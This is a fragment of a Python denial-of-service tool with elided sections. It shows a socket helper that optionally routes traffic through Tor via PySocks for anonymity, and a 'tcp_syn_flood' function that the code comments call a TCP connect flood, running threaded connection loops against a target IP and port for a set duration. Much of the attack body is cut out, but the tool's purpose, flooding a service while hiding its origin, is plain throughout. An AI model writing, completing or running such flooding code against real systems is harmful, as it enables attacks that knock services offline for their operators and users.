...
def get_socket():
    if USE_TOR:
        try:
            import socks  # PySocks - only needed for Tor mode
        except ImportError:
            print("[!] PySocks required for Tor mode (pip install pysocks)")
...
def tcp_syn_flood(ip, port, duration, threads):
    # NOTE: implemented as a TCP connect() flood (no raw sockets / spoofing).
    def attack():
        end = time.time() + duration
        while time.time() < end:
            try:
    ...
    run_threads(attack, threads, duration, "TCP Connect Flood")
